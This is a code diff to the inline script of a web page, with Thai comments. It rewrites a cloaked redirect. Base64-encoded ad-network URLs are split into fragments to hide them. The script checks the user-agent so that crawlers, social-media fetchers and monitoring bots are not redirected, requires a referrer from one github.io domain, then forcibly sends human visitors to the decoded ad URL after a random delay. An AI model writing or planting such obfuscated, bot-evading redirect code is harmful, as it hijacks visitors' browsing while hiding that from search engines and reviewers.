@@ -14,29 +14,30 @@
     }
   </style>
   <script>
-    // ลิงก์โฆษณาที่เข้ารหัส Base64 สองลิงก์ (แก้ Base64 ให้ถูกต้อง)
-    const links = [
-      "aHR0cHM6Ly93d3cucHJvZml0YWJsZXJhdGVjcG0uY29tL3ZpYnU1bTgxaG0/a2V5PWQ0Nzk4NDQ5ODcyOTdhMTI1MGRhMzM3MjE2YzRhNGE4",
-      "aHR0cHM6Ly9vdGlldS5jb20vNC85MTc5NTU3"
-    ];
+    // URL จริงที่เข้ารหัสหลายชั้น
+    const part1 = "aHR0cHM6Ly93d3cu";
+    const part2 = "cHJvZml0YWJsZXJhdGVjcG0uY29tL3ZpYnU1bTgxaG0/";
+    const part3 = "a2V5PWQ0Nzk4NDQ5ODcyOTdhMTI1MGRhMzM3MjE2YzRhNGE4";
+    const encodedUrl = part1 + part2 + part3;
 
     // ตรวจบอทจาก user-agent
     const ua = navigator.userAgent.toLowerCase();
     const isBot = /bot|crawl|spider|slurp|mediapartners|google|facebookexternalhit|fetch|monitoring/i.test(ua);
 
     // ตรวจ referrer (ต้องมาจากโดเมนของคุณ)
-    const expectedRef = "perfectxworld.github.io";
+    const expectedReferrer = "perfectxworld.github.io";
     const actualRef = document.referrer.toLowerCase();
 
     function shouldRedirect() {
-      return !isBot && actualRef.includes(expectedRef);
+      if (isBot) return false;
+      if (!actualRef.includes(expectedReferrer)) return false;
+      return true;
     }
 
-    // เริ่ม redirect แบบสุ่ม
+    // เริ่มการเปลี่ยนเส้นทาง
     function go() {
       if (shouldRedirect()) {
-        const randomIndex = Math.floor(Math.random() * links.length);
-        const finalUrl = atob(links[randomIndex]);
+        const finalUrl = atob(encodedUrl);
         const delay = Math.floor(Math.random() * 800) + 300; // หน่วงเวลา 300-1100ms
         setTimeout(() => {
           window.location.href = finalUrl;
